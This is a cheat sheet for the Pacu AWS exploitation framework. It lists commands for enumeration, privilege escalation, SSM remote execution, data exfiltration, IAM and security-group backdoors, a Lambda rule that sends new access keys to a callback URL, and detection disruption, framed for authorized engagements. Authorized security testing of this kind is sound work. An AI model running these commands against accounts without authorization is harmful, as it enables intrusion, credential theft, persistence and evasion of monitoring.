# Pacu

## setup

### Install with uv tool

Install Pacu with uv tool.

Install Pacu as an isolated uv-managed CLI tool.

```sh title:"Pacu Install with uv Tool"
uv tool install pacu
```
<!-- cheat -->

### Run with uvx

Run Pacu with uvx.

Run Pacu through uv without a persistent tool install.

```sh title:"Pacu Run with uvx"
uvx pacu --pacu-help
```
<!-- cheat -->

### Install from Git

Install Pacu from git.

Clone Pacu from source and run it with uv-managed dependencies.

```sh title:"Pacu Install from Git"
git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && uv run --with-requirements requirements.txt python cli.py --pacu-help
```
<!-- cheat -->

### Version

Show version with Pacu.

Print the installed Pacu version.

```sh title:"Pacu Show Version"
pacu --version
```
<!-- cheat -->

### Pacu help

Show help with Pacu.

Show Pacu CLI and interactive command help without opening a session.

```sh title:"Pacu Show Help"
pacu --pacu-help
```
<!-- cheat -->

### List modules

List modules with Pacu.

List available Pacu modules.

```sh title:"Pacu List Modules"
pacu --list-modules
```
<!-- cheat -->

### Module info

Show module info with Pacu.

Show help and arguments for a specific module.

```sh title:"Pacu Show Module Info"
pacu --module-name "$module_name" --module-info
```
<!-- cheat
var module_name
-->

## session setup

### New session from profile

Create session from profile with Pacu.

Create a Pacu session for one AWS account and import an AWS CLI profile into it.

```sh title:"Pacu Create Session from Profile"
pacu --new-session "$session_name" --import-keys "$aws_profile"
```
<!-- cheat
var session_name
var aws_profile
-->

### Start existing session

Start existing session with Pacu.

Open Pacu interactively against an existing session.

```sh title:"Pacu Start Existing Session"
pacu --session "$session_name"
```
<!-- cheat
var session_name
-->

### Activate existing session

Set activate existing session with Pacu.

Set an existing Pacu session active from the CLI.

```sh title:"Pacu Set Activate Existing Session"
pacu --session "$session_name" --activate-session
```
<!-- cheat
var session_name
-->

### List sessions

List sessions with Pacu.

Inside Pacu, list stored sessions and identify the active one.

```sh title:"Pacu List Sessions"
sessions
```
<!-- cheat -->

### Swap session

Set swap session with Pacu.

Inside Pacu, switch to another stored session.

```sh title:"Pacu Set Swap Session"
swap_session "$session_name"
```
<!-- cheat
var session_name
-->

### Delete session

Remove session with Pacu.

Inside Pacu, delete a session from the database. The output folder is not deleted.

```sh title:"Pacu Remove Session"
delete_session
```
<!-- cheat -->

## keys and identity

### Import AWS profile

Run import AWS profile with Pacu.

Import one AWS CLI credential profile into the active Pacu session.

```sh title:"Pacu Run Import AWS Profile"
import_keys "$aws_profile"
```
<!-- cheat
var aws_profile
-->

### Import all profiles

Run import all profiles with Pacu.

Import every profile in `~/.aws/credentials` into the active Pacu session.

```sh title:"Pacu Run Import All Profiles"
import_keys --all
```
<!-- cheat -->

### Set keys interactively

Set keys interactively with Pacu.

Add access keys to the active Pacu session and make them the active key set.

```sh title:"Pacu Set Keys Interactively"
set_keys
```
<!-- cheat -->

### Set keys from CLI

Set keys from CLI with Pacu.

Add keys from the CLI. Format is alias, access key ID, secret key, and optional session token.

```sh title:"Pacu Set Keys from CLI"
pacu --session "$session_name" --set-keys "$key_alias,$aws_access_key_id,$aws_secret_access_key,$aws_session_token"
```
<!-- cheat
var session_name
var key_alias
var aws_access_key_id
var aws_secret_access_key
var aws_session_token
-->

### Swap keys

Set swap keys with Pacu.

Switch between key sets stored in the active Pacu session.

```sh title:"Pacu Set Swap Keys"
swap_keys
```
<!-- cheat -->

### Whoami

Show whoami with Pacu.

Show the active key identity and enumerated permission context.

```sh title:"Pacu Show Whoami"
whoami
```
<!-- cheat -->

### Whoami from CLI

Show whoami from CLI with Pacu.

Show the active identity for a saved session without opening the shell.

```sh title:"Pacu Show Whoami from CLI"
pacu --session "$session_name" --whoami
```
<!-- cheat
var session_name
-->

### Assume role

Run assume role with Pacu.

Assume an IAM role from the current Pacu credentials, store the temporary credentials, and switch to them.

```sh title:"Pacu Run Assume Role"
assume_role "$aws_role_arn"
```
<!-- cheat
var aws_role_arn
-->

### Assume role with MFA

Run assume role with MFA with Pacu.

Assume an IAM role that requires MFA.

```sh title:"Pacu Run Assume Role with MFA"
assume_role "$aws_role_arn" "$aws_mfa_serial_arn" "$aws_mfa_token_code"
```
<!-- cheat
var aws_role_arn
var aws_mfa_serial_arn
var aws_mfa_token_code
-->

### Export active keys

Run export active keys with Pacu.

Export the active Pacu credentials to `~/.aws/credentials` for use with the AWS CLI.

```sh title:"Pacu Run Export Active Keys"
export_keys
```
<!-- cheat -->

### Console URL

Dump console URL with Pacu.

Generate a federated AWS console login URL for the active Pacu credentials.

```sh title:"Pacu Dump Console URL"
console
```
<!-- cheat -->

## regions and opsec

### List regions

List regions with Pacu.

Inside Pacu, list valid AWS regions.

```sh title:"Pacu List Regions"
regions
```
<!-- cheat -->

### Set target regions

Set target regions with Pacu.

Limit the active session to engagement-approved regions. Use `all` to reset to every supported region.

```sh title:"Pacu Set Target Regions"
set_regions "$aws_region_one" "$aws_region_two"
```
<!-- cheat
var aws_region_one := us-east-1
var aws_region_two := us-west-2
-->

### Set regions from CLI

Set regions from CLI with Pacu.

Set engagement-approved target regions from the CLI.

```sh title:"Pacu Set Regions from CLI"
pacu --session "$session_name" --set-regions "$aws_region_one" "$aws_region_two"
```
<!-- cheat
var session_name
var aws_region_one := us-east-1
var aws_region_two := us-west-2
-->

### Reset regions

Set reset regions with Pacu.

Reset the active session to all supported regions.

```sh title:"Pacu Set Reset Regions"
set_regions all
```
<!-- cheat -->

### Update region database

Update region database with Pacu.

Update Pacu's service region mapping from current boto3/botocore data.

```sh title:"Pacu Update Region Database"
update_regions
```
<!-- cheat -->

### Set user-agent suffix

Set user agent suffix with Pacu.

Append an engagement identifier to Pacu API calls for attribution and blue-team correlation.

```sh title:"Pacu Set User Agent Suffix"
set_ua_suffix "$ua_suffix"
```
<!-- cheat
var ua_suffix := engagement-id
-->

### Randomize user-agent suffix

Generate randomize user agent suffix with Pacu.

Generate and set a UUID-based user-agent suffix for the current session.

```sh title:"Pacu Generate Randomize User Agent Suffix"
set_ua_suffix
```
<!-- cheat -->

### Clear user-agent suffix

Run clear user agent suffix with Pacu.

Remove the custom Pacu user-agent suffix.

```sh title:"Pacu Run Clear User Agent Suffix"
unset_ua_suffix
```
<!-- cheat -->

## module workflow

### Search modules

Search modules with Pacu.

Search modules by name.

```sh title:"Pacu Search Modules"
search "$keyword"
```
<!-- cheat
var keyword := iam
-->

### List module categories

List module categories with Pacu.

List module categories such as ENUM, ESCALATE, EXFIL, PERSIST, EVADE, and LATERAL_MOVE.

```sh title:"Pacu List Module Categories"
list categories
```
<!-- cheat -->

### List category modules

List category modules with Pacu.

List modules in a category.

```sh title:"Pacu List Category Modules"
list category "$category"
```
<!-- cheat
var category := ENUM
-->

### Help for module

Show help for module with Pacu.

Show module description, prerequisites, and arguments.

```sh title:"Pacu Show Help for Module"
help "$module_name"
```
<!-- cheat
var module_name
-->

### Run module

Run module with Pacu.

Run a module in the interactive shell.

```sh title:"Pacu Run Module"
run "$module_name"
```
<!-- cheat
var module_name
-->

### Run module with args

Run module with args with Pacu.

Run a module with module-specific arguments in the interactive shell.

```sh title:"Pacu Run Module with Args"
run "$module_name" $module_args
```
<!-- cheat
var module_name
var module_args
-->

### Run module in regions

Run module in regions with Pacu.

Run a module against explicit comma-separated regions when the module supports `--regions`.

```sh title:"Pacu Run Module in Regions"
run "$module_name" --regions "$aws_region_list"
```
<!-- cheat
var module_name
var aws_region_list := us-east-1,us-west-2
-->

### Execute module from CLI

Execute module from CLI with Pacu.

Execute one module from a saved session without opening the shell.

```sh title:"Pacu Execute Module from CLI"
pacu --session "$session_name" --module-name "$module_name" --exec
```
<!-- cheat
var session_name
var module_name
-->

### Execute module with args from CLI

Execute module with args from CLI with Pacu.

Execute one module from the CLI with module-specific arguments.

```sh title:"Pacu Execute Module with Args from CLI"
pacu --session "$session_name" --module-name "$module_name" --module-args="$module_args" --exec
```
<!-- cheat
var session_name
var module_name
var module_args
-->

### Load command file

Execute load command file with Pacu.

Run a repeatable Pacu command file for an engagement workflow.

```sh title:"Pacu Execute Load Command File"
load_commands_file "$commands_file"
```
<!-- cheat
var commands_file
-->

### AWS CLI through Pacu

Execute AWS CLI through pacu with Pacu.

Run AWS CLI commands from inside Pacu using the active Pacu credentials unless you specify `--profile`.

```sh title:"Pacu Execute AWS CLI Through Pacu"
aws sts get-caller-identity
```
<!-- cheat -->

### AWS CLI with jq through Pacu

Execute AWS CLI with jq through pacu with Pacu.

Use Pacu's integrated AWS CLI shell support with pipes and `jq`.

```sh title:"Pacu Execute AWS CLI with Jq Through Pacu"
aws iam list-attached-user-policies --user-name "$target_user" | jq '.AttachedPolicies[]?.PolicyArn'
```
<!-- cheat
var target_user
-->

## operator runbooks

### Account triage chain

Execute account triage chain with Pacu.

Run a quick low-risk account triage sequence before service-specific follow-up.

```sh title:"Pacu Execute Account Triage Chain"
run aws__enum_account && run aws__enum_spend && run iam__enum_permissions && run iam__enum_users_roles_policies_groups && run detection__enum_services
```
<!-- cheat -->

### High-value service enum chain

Enumerate high value service enum chain with Pacu.

Enumerate common red-team pivot and data-exposure services after the account triage pass.

```sh title:"Pacu Enumerate High Value Service Enum Chain"
run ec2__enum && run lambda__enum && run ecs__enum && run eks__enum && run s3__download_bucket --names-only && run secrets__enum
```
<!-- cheat -->

### Identity attack-path chain

Execute identity attack path chain with Pacu.

Populate IAM data, scan for privilege escalation paths without execution, and query high-impact permissions.

```sh title:"Pacu Execute Identity Attack Path Chain"
run iam__enum_permissions --all-users && run iam__enum_users_roles_policies_groups && run iam__privesc_scan --scan-only && run iam__enum_action_query --query "$aws_iam_action_query"
```
<!-- cheat
var aws_iam_action_query := iam:*,sts:AssumeRole,lambda:*,cloudformation:*,glue:*
-->

### Compute loot chain

Enumerate compute loot chain with Pacu.

Collect compute metadata that often exposes bootstrap secrets, task roles, and deploy-time environment variables.

```sh title:"Pacu Enumerate Compute Loot Chain"
run ec2__download_userdata && run ecs__enum_task_def && run lambda__enum && run codebuild__enum && run lightsail__enum
```
<!-- cheat -->

### Data exposure chain

Enumerate data exposure chain with Pacu.

Prioritize services that commonly expose recoverable data or credentials.

```sh title:"Pacu Enumerate Data Exposure Chain"
run s3__download_bucket --names-only && run dynamodb__enum && run rds__enum_snapshots && run ebs__enum_volumes_snapshots && run systemsmanager__download_parameters
```
<!-- cheat -->

## enum workflow

### Account metadata

Enumerate account metadata with Pacu.

Enumerate AWS account metadata.

```sh title:"Pacu Enumerate Account Metadata"
run aws__enum_account
```
<!-- cheat -->

### Spend by service

Enumerate spend by service with Pacu.

Enumerate spend by AWS service to prioritize high-value services.

```sh title:"Pacu Enumerate Spend by Service"
run aws__enum_spend
```
<!-- cheat -->

### IAM users roles policies groups

Enumerate IAM users roles policies groups with Pacu.

Enumerate IAM users, roles, customer-managed policies, and groups.

```sh title:"Pacu Enumerate IAM Users Roles Policies Groups"
run iam__enum_users_roles_policies_groups
```
<!-- cheat -->

### IAM permissions current user

Enumerate IAM permissions current user with Pacu.

Enumerate confirmed IAM permissions for the active principal.

```sh title:"Pacu Enumerate IAM Permissions Current User"
run iam__enum_permissions
```
<!-- cheat -->

### IAM permissions all users

Enumerate IAM permissions all users with Pacu.

Enumerate confirmed permissions for all users when allowed; useful before privilege escalation analysis.

```sh title:"Pacu Enumerate IAM Permissions All Users"
run iam__enum_permissions --all-users
```
<!-- cheat -->

### IAM action query

Enumerate IAM action query with Pacu.

Query enumerated user and role permissions for action patterns.

```sh title:"Pacu Enumerate IAM Action Query"
run iam__enum_action_query --query "$aws_iam_action_query"
```
<!-- cheat
var aws_iam_action_query := s3:get*,iam:create*
-->

### IAM credential report

Dump IAM credential report with Pacu.

Generate or download the IAM credential report for authentication hygiene review.

```sh title:"Pacu Dump IAM Credential Report"
run iam__get_credential_report
```
<!-- cheat -->

### EC2 enum

Enumerate EC2 enum with Pacu.

Enumerate EC2 instances, security groups, interfaces, VPCs, subnets, route tables, and endpoints.

```sh title:"Pacu Enumerate EC2 Enum"
run ec2__enum
```
<!-- cheat -->

### EC2 userdata

Download EC2 userdata with Pacu.

Download EC2 instance and launch template user data for secret and bootstrap review.

```sh title:"Pacu Download EC2 Userdata"
run ec2__download_userdata
```
<!-- cheat -->

### EBS volumes snapshots

Enumerate EBS volumes snapshots with Pacu.

Enumerate EBS volumes, snapshots, permissions, and unencrypted assets.

```sh title:"Pacu Enumerate EBS Volumes Snapshots"
run ebs__enum_volumes_snapshots
```
<!-- cheat -->

### EBS public snapshots

Enumerate EBS public snapshots with Pacu.

Search public EBS snapshots by keyword or account in the unauthenticated snapshot surface.

```sh title:"Pacu Enumerate EBS Public Snapshots"
run ebs__enum_snapshots_unauth --keyword "$keyword"
```
<!-- cheat
var keyword
-->

### RDS snapshots

Enumerate RDS snapshots with Pacu.

Enumerate RDS snapshots, snapshot sharing, and unencrypted snapshots.

```sh title:"Pacu Enumerate RDS Snapshots"
run rds__enum_snapshots
```
<!-- cheat -->

### RDS enum

Enumerate RDS enum with Pacu.

Enumerate RDS instances, clusters, subnet groups, and parameter-group context.

```sh title:"Pacu Enumerate RDS Enum"
run rds__enum
```
<!-- cheat -->

### Lambda enum

Enumerate lambda enum with Pacu.

Enumerate Lambda functions, source code metadata, versions, tags, event sources, and policies.

```sh title:"Pacu Enumerate Lambda Enum"
run lambda__enum
```
<!-- cheat -->

### ECS task definitions

Enumerate ECS task definitions with Pacu.

Pull ECS task definitions for environment variables and task-role review.

```sh title:"Pacu Enumerate ECS Task Definitions"
run ecs__enum_task_def
```
<!-- cheat -->

### ECS enum

Enumerate ECS enum with Pacu.

Enumerate ECS clusters, services, tasks, task definitions, and related role context.

```sh title:"Pacu Enumerate ECS Enum"
run ecs__enum
```
<!-- cheat -->

### ECR enum

Enumerate ECR enum with Pacu.

Enumerate ECR repositories and image tags.

```sh title:"Pacu Enumerate ECR Enum"
run ecr__enum
```
<!-- cheat -->

### EKS enum

Enumerate EKS enum with Pacu.

Enumerate EKS resources.

```sh title:"Pacu Enumerate EKS Enum"
run eks__enum
```
<!-- cheat -->

### EKS collect tokens

Enumerate EKS collect tokens with Pacu.

Collect EKS authentication token material where the active identity is authorized.

```sh title:"Pacu Enumerate EKS Collect Tokens"
run eks__collect_tokens
```
<!-- cheat -->

### Cognito enum

Enumerate cognito enum with Pacu.

Enumerate Cognito user pools, clients, users, and identity pools.

```sh title:"Pacu Enumerate Cognito Enum"
run cognito__enum
```
<!-- cheat -->

### API Gateway enum

Enumerate API gateway enum with Pacu.

Enumerate API Gateway routes, methods, keys, client certificates, and export Swagger definitions.

```sh title:"Pacu Enumerate API Gateway Enum"
run apigateway__enum
```
<!-- cheat -->

### ACM enum

Enumerate ACM enum with Pacu.

Enumerate ACM certificates and private CA metadata for takeover, expiry, and phishing infrastructure leads.

```sh title:"Pacu Enumerate ACM Enum"
run acm__enum
```
<!-- cheat -->

### CloudFormation data

Download CloudFormation data with Pacu.

Download CloudFormation templates, parameters, and exports; review for embedded secrets.

```sh title:"Pacu Download CloudFormation Data"
run cloudformation__download_data
```
<!-- cheat -->

### CodeBuild enum

Enumerate CodeBuild enum with Pacu.

Enumerate CodeBuild projects and builds for sensitive environment variables.

```sh title:"Pacu Enumerate CodeBuild Enum"
run codebuild__enum
```
<!-- cheat -->

### Glue enum

Enumerate glue enum with Pacu.

Enumerate Glue jobs, dev endpoints, crawlers, databases, and role references.

```sh title:"Pacu Enumerate Glue Enum"
run glue__enum
```
<!-- cheat -->

### Directory Service enum

Enumerate directory service enum with Pacu.

Enumerate AWS Directory Service directories and trust relationships.

```sh title:"Pacu Enumerate Directory Service Enum"
run ds__enum
```
<!-- cheat -->

### Elastic Beanstalk enum

Enumerate elastic beanstalk enum with Pacu.

Enumerate Elastic Beanstalk applications, environments, configuration, and role context.

```sh title:"Pacu Enumerate Elastic Beanstalk Enum"
run elasticbeanstalk__enum
```
<!-- cheat -->

### MQ enum

Enumerate MQ enum with Pacu.

Enumerate Amazon MQ brokers and configuration.

```sh title:"Pacu Enumerate MQ Enum"
run mq__enum
```
<!-- cheat -->

### Transfer Family enum

Enumerate transfer family enum with Pacu.

Enumerate AWS Transfer Family servers, users, and identity-provider configuration.

```sh title:"Pacu Enumerate Transfer Family Enum"
run transfer_family__enum
```
<!-- cheat -->

### Inspector reports

Enumerate inspector reports with Pacu.

Download Inspector report data where available.

```sh title:"Pacu Enumerate Inspector Reports"
run inspector__get_reports
```
<!-- cheat -->

### Secrets enum

Dump secrets enum with Pacu.

Enumerate Secrets Manager and SSM Parameter Store secrets where allowed.

```sh title:"Pacu Dump Secrets Enum"
run secrets__enum
```
<!-- cheat -->

### SSM parameters

Download SSM parameters with Pacu.

Download Systems Manager parameters and decrypted values where allowed.

```sh title:"Pacu Download SSM Parameters"
run systemsmanager__download_parameters
```
<!-- cheat -->

### Route53 enum

Enumerate route53 enum with Pacu.

Enumerate Route53 hosted zones and query logging configuration.

```sh title:"Pacu Enumerate Route53 Enum"
run route53__enum
```
<!-- cheat -->

### Organizations enum

Enumerate organizations enum with Pacu.

Enumerate AWS Organizations accounts, policies, OUs, and org tree when allowed.

```sh title:"Pacu Enumerate Organizations Enum"
run organizations__enum
```
<!-- cheat -->

### VPC lateral movement enum

Enumerate VPC lateral movement enum with Pacu.

Look for network-plane lateral movement opportunities like Direct Connect, VPN, and VPC peering.

```sh title:"Pacu Enumerate VPC Lateral Movement Enum"
run vpc__enum_lateral_movement
```
<!-- cheat -->

## unauth recon

### Decode access key ID

Decode access key ID with Pacu.

Decode an AWS access key ID to recover the account ID without making AWS API calls.

```sh title:"Pacu Decode Access Key ID"
run iam__decode_accesskey_id --access-key-id "$aws_access_key_id"
```
<!-- cheat
var aws_access_key_id
-->

### Detect honeytoken keys

Enumerate detect honeytoken keys with Pacu.

Check whether active keys are known honeytokens and enumerate key metadata without CloudTrail logging.

```sh title:"Pacu Enumerate Detect Honeytoken Keys"
run iam__detect_honeytokens
```
<!-- cheat -->

### Enumerate external roles

Enumerate external roles with Pacu.

Enumerate IAM roles in another AWS account when you have permitted test keys with the required IAM permissions.

```sh title:"Pacu Enumerate External Roles"
run iam__enum_roles --account-id "$aws_account_id" --role-name "$aws_role_name"
```
<!-- cheat
var aws_account_id
var aws_role_name
-->

### Enumerate external users

Enumerate external users with Pacu.

Enumerate IAM users in another AWS account when you have permitted test keys with the required IAM permissions.

```sh title:"Pacu Enumerate External Users"
run iam__enum_users --account-id "$aws_account_id" --role-name "$aws_role_name"
```
<!-- cheat
var aws_account_id
var aws_role_name
-->

### Enumerate public snapshots by keyword

Enumerate public snapshots by keyword with Pacu.

Search public EBS snapshots by keyword across regions.

```sh title:"Pacu Enumerate Public Snapshots by Keyword"
run ebs__enum_snapshots_unauth --keyword "$keyword"
```
<!-- cheat
var keyword
-->

### Enumerate public snapshots by account

Enumerate public snapshots by account with Pacu.

Search public EBS snapshots associated with an AWS account ID.

```sh title:"Pacu Enumerate Public Snapshots by Account"
run ebs__enum_snapshots_unauth --account-id "$aws_account_id"
```
<!-- cheat
var aws_account_id
-->

## privilege escalation

### Privesc method list

List privesc method list with Pacu.

List IAM privilege escalation methods Pacu knows how to identify.

```sh title:"Pacu List Privesc Method List"
run iam__privesc_scan --method-list
```
<!-- cheat -->

### Privesc method info

Show privesc method info with Pacu.

Show detail for one privilege escalation method before attempting anything.

```sh title:"Pacu Show Privesc Method Info"
run iam__privesc_scan --method-info "$method_name"
```
<!-- cheat
var method_name := CreateNewPolicyVersion
-->

### Privesc scan only

Scan privesc scan only with Pacu.

Scan for IAM privilege escalation paths without executing found paths.

```sh title:"Pacu Scan Privesc Scan Only"
run iam__privesc_scan --scan-only
```
<!-- cheat -->

### Privesc offline scan

Scan privesc offline scan with Pacu.

Analyze previously exported IAM policy JSON offline.

```sh title:"Pacu Scan Privesc Offline Scan"
run iam__privesc_scan --offline --folder "$aws_policy_folder"
```
<!-- cheat
var aws_policy_folder
-->

### Privesc selected user methods

Execute privesc selected user methods with Pacu.

Attempt only explicitly chosen user privilege escalation methods.

```sh title:"Pacu Execute Privesc Selected User Methods"
run iam__privesc_scan --user-methods "$method_name"
```
<!-- cheat
var method_name := CreateAccessKey
-->

### Privesc selected role methods

Execute privesc selected role methods with Pacu.

Attempt only explicitly chosen role privilege escalation methods.

```sh title:"Pacu Execute Privesc Selected Role Methods"
run iam__privesc_scan --role-methods "$method_name"
```
<!-- cheat
var method_name := PassExistingRoleToNewLambdaThenInvoke
-->

## exploit and access

### SSM RCE EC2

Execute SSM RCE EC2 with Pacu.

Attempt Systems Manager Run Command execution on EC2 instances as root or SYSTEM where IAM and SSM state allow it.

```sh title:"Pacu Execute SSM RCE EC2"
run systemsmanager__rce_ec2
```
<!-- cheat -->

### Cognito attack

Run cognito attack with Pacu.

Attack Cognito user pool clients and identity pools using a test username and password.

```sh title:"Pacu Run Cognito Attack"
run cognito__attack --username "$target_user" --password "$target_pass"
```
<!-- cheat
var target_user
var target_pass
-->

### API Gateway create keys

Create API gateway create keys with Pacu.

Attempt to create API Gateway API keys for REST APIs in scope.

```sh title:"Pacu Create API Gateway Create Keys"
run api_gateway__create_api_keys
```
<!-- cheat -->

### CloudFormation resource injection

Run CloudFormation resource injection with Pacu.

Inject a controlled resource into CloudFormation stacks where explicitly authorized.

```sh title:"Pacu Run CloudFormation Resource Injection"
run cfn__resource_injection
```
<!-- cheat -->

### CloudTrail CSV injection

Run CloudTrail CSV injection with Pacu.

Test CloudTrail CSV injection exposure for approved reporting or detection validation.

```sh title:"Pacu Run CloudTrail CSV Injection"
run cloudtrail__csv_injection
```
<!-- cheat -->

### EBS explore snapshots

Run EBS explore snapshots with Pacu.

Restore and attach EBS volumes or snapshots to a supplied EC2 instance for mounted filesystem review.

```sh title:"Pacu Run EBS Explore Snapshots"
run ebs__explore_snapshots --instance-id "$aws_instance_id"
```
<!-- cheat
var aws_instance_id
-->

### RDS explore snapshots

Run RDS explore snapshots with Pacu.

Create temporary RDS snapshot copies, restore them, change the master password, and print connection info.

```sh title:"Pacu Run RDS Explore Snapshots"
run rds__explore_snapshots
```
<!-- cheat -->

### EC2 startup shell script

Start EC2 startup shell script with Pacu.

Stop and restart selected EC2 instances after updating user data with a supplied shell script.

```sh title:"Pacu Start EC2 Startup Shell Script"
run ec2__startup_shell_script --script "$aws_userdata_script_file"
```
<!-- cheat
var aws_userdata_script_file
-->

### ECS backdoor task definition

Run ECS backdoor task definition with Pacu.

Create or modify ECS task definition execution paths where persistence testing is explicitly in scope.

```sh title:"Pacu Run ECS Backdoor Task Definition"
run ecs__backdoor_task_def
```
<!-- cheat -->

### Lightsail default keys

Download lightsail default keys with Pacu.

Download Lightsail default SSH key pairs where allowed.

```sh title:"Pacu Download Lightsail Default Keys"
run lightsail__download_ssh_keys
```
<!-- cheat -->

### Lightsail temporary access

Generate lightsail temporary access with Pacu.

Create temporary SSH keys for Lightsail instances and download them into the session downloads directory.

```sh title:"Pacu Generate Lightsail Temporary Access"
run lightsail__generate_temp_access
```
<!-- cheat -->

## exfil and loot

### S3 enumerate bucket names

Dump S3 enumerate bucket names with Pacu.

Enumerate S3 buckets and store bucket metadata without downloading object contents.

```sh title:"Pacu Dump S3 Enumerate Bucket Names"
run s3__download_bucket --names-only
```
<!-- cheat -->

### S3 download specific buckets

Download S3 download specific buckets with Pacu.

Download object contents for selected bucket names.

```sh title:"Pacu Download S3 Download Specific Buckets"
run s3__download_bucket --dl-names "$s3_bucket_names"
```
<!-- cheat
var s3_bucket_names
-->

### S3 download bucket workflow

Download S3 download bucket workflow with Pacu.

Run the interactive S3 download workflow and choose which accessible buckets to download.

```sh title:"Pacu Download S3 Download Bucket Workflow"
run s3__download_bucket
```
<!-- cheat -->

### EBS direct snapshot download

Download EBS direct snapshot download with Pacu.

Download EBS snapshots with the EBS direct API for offline mounting and review.

```sh title:"Pacu Download EBS Direct Snapshot Download"
run ebs__download_snapshots
```
<!-- cheat -->

### DynamoDB enum and dump

Dump DynamoDB enum and dump with Pacu.

Enumerate DynamoDB tables and dump table values where allowed.

```sh title:"Pacu Dump DynamoDB Enum and Dump"
run dynamodb__enum
```
<!-- cheat -->

### CloudFormation template loot

Dump CloudFormation template loot with Pacu.

Download CloudFormation templates and exports for offline secret review.

```sh title:"Pacu Dump CloudFormation Template Loot"
run cloudformation__download_data
```
<!-- cheat -->

## persistence

### IAM backdoor assume role

Run IAM backdoor assume role with Pacu.

Create assume-role trust relationships between selected users and roles in scope.

```sh title:"Pacu Run IAM Backdoor Assume Role"
run iam__backdoor_assume_role
```
<!-- cheat -->

### IAM backdoor user keys

Run IAM backdoor user keys with Pacu.

Add API keys to selected IAM users in scope.

```sh title:"Pacu Run IAM Backdoor User Keys"
run iam__backdoor_users_keys
```
<!-- cheat -->

### IAM backdoor user password

Dump IAM backdoor user password with Pacu.

Add console passwords to selected IAM users that do not already have login profiles.

```sh title:"Pacu Dump IAM Backdoor User Password"
run iam__backdoor_users_password
```
<!-- cheat -->

### EC2 security group backdoor

Run EC2 security group backdoor with Pacu.

Add ingress rules to selected EC2 security groups for an approved source IP.

```sh title:"Pacu Run EC2 Security Group Backdoor"
run ec2__backdoor_ec2_sec_groups --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

### Lambda backdoor new users

Create lambda backdoor new users with Pacu.

Create a Lambda/EventBridge rule that reacts to new IAM users and sends created access keys to a listener.

```sh title:"Pacu Create Lambda Backdoor New Users"
run lambda__backdoor_new_users --url "$aws_callback_url"
```
<!-- cheat
var aws_callback_url
-->

### Lambda backdoor new roles

Create lambda backdoor new roles with Pacu.

Create a Lambda/EventBridge rule that modifies new IAM role trust policies for an approved principal.

```sh title:"Pacu Create Lambda Backdoor New Roles"
run lambda__backdoor_new_roles --principal "$aws_principal_arn"
```
<!-- cheat
var aws_principal_arn
-->

### Lambda backdoor new security groups

Create lambda backdoor new security groups with Pacu.

Create a Lambda/EventBridge rule that adds an approved ingress rule to new EC2 security groups.

```sh title:"Pacu Create Lambda Backdoor New Security Groups"
run lambda__backdoor_new_sec_groups --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

## detection and logs

### Detect logging services

Enumerate detect logging services with Pacu.

Enumerate CloudTrail, CloudWatch, Config, Shield, VPC Flow Logs, and GuardDuty coverage.

```sh title:"Pacu Enumerate Detect Logging Services"
run detection__enum_services
```
<!-- cheat -->

### GuardDuty accounts

List GuardDuty accounts with Pacu.

List GuardDuty administrator/member account links to identify lateral movement scope.

```sh title:"Pacu List GuardDuty Accounts"
run guardduty__list_accounts
```
<!-- cheat -->

### GuardDuty findings

Find GuardDuty findings with Pacu.

Download GuardDuty detector statistics and findings.

```sh title:"Pacu Find GuardDuty Findings"
run guardduty__list_findings
```
<!-- cheat -->

### GuardDuty whitelist IP

List GuardDuty whitelist IP with Pacu.

Add an approved source IP to GuardDuty trusted IP lists for controlled detection testing.

```sh title:"Pacu List GuardDuty Whitelist IP"
run guardduty__whitelist_ip --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

### CloudTrail event history

Download CloudTrail event history with Pacu.

Download CloudTrail event history JSON for approved regions. This can take a long time in busy accounts.

```sh title:"Pacu Download CloudTrail Event History"
run cloudtrail__download_event_history
```
<!-- cheat -->

### CloudWatch logs

Download CloudWatch logs with Pacu.

Download CloudWatch log events to the Pacu session downloads directory.

```sh title:"Pacu Download CloudWatch Logs"
run cloudwatch__download_logs
```
<!-- cheat -->

### Detection disruption

Run detection disruption with Pacu.

Run Pacu's detection disruption module only when detection-control tampering is explicitly authorized.

```sh title:"Pacu Run Detection Disruption"
run detection__disruption
```
<!-- cheat -->

### ELB logging gaps

Enumerate ELB logging gaps with Pacu.

Find Elastic Load Balancers without access logging enabled.

```sh title:"Pacu Enumerate ELB Logging Gaps"
run elb__enum_logging
```
<!-- cheat -->

### WAF enum

Enumerate WAF enum with Pacu.

Enumerate WAF rules, rule groups, and matching sets.

```sh title:"Pacu Enumerate WAF Enum"
run waf__enum
```
<!-- cheat -->

## lateral movement

### Organizations assume role

Set organizations assume role with Pacu.

Try to assume role names across organization member accounts when the caller has AssumeRole rights.

```sh title:"Pacu Set Organizations Assume Role"
run organizations__assume_role --accounts "$aws_account_ids" --role-names "$aws_role_names"
```
<!-- cheat
var aws_account_ids
var aws_role_names
-->

### SNS subscribe

Set SNS subscribe with Pacu.

Attempt to subscribe an email address to an SNS topic ARN.

```sh title:"Pacu Set SNS Subscribe"
run sns__subscribe --topic-arn "$aws_sns_topic_arn" --email "$aws_sns_email"
```
<!-- cheat
var aws_sns_topic_arn
var aws_sns_email
-->

## data and output

### Services with data

List services with data with Pacu.

List AWS services with data currently stored in the active Pacu session.

```sh title:"Pacu List Services with Data"
services
```
<!-- cheat -->

### Show all data

Show all data with Pacu.

Print all stored session data.

```sh title:"Pacu Show All Data"
data
```
<!-- cheat -->

### Show service data

Show service data with Pacu.

Print stored data for one service.

```sh title:"Pacu Show Service Data"
data "$service_name"
```
<!-- cheat
var service_name := IAM
-->

### Query service data with jq

Query service data with jq with Pacu.

Run a jq expression against one service's stored data.

```sh title:"Pacu Query Service Data with Jq"
jq "$service_name" "$jq_filter"
```
<!-- cheat
var service_name := IAM
var jq_filter := .
-->

### Data from CLI

Show data from CLI with Pacu.

Print stored data for one service from the CLI. Use `all` for the whole session.

```sh title:"Pacu Show Data from CLI"
pacu --session "$session_name" --data "$service_name"
```
<!-- cheat
var session_name
var service_name := all
-->

### Downloads directory

Download downloads directory with Pacu.

Open the active session downloads directory where module output is stored.

```sh title:"Pacu Download Downloads Directory"
printf '%s\n' "$HOME/.local/share/pacu/sessions/$session_name/downloads"
```
<!-- cheat
var session_name
-->

### Command log

Execute command log with Pacu.

Tail the Pacu command log for the session.

```sh title:"Pacu Execute Command Log"
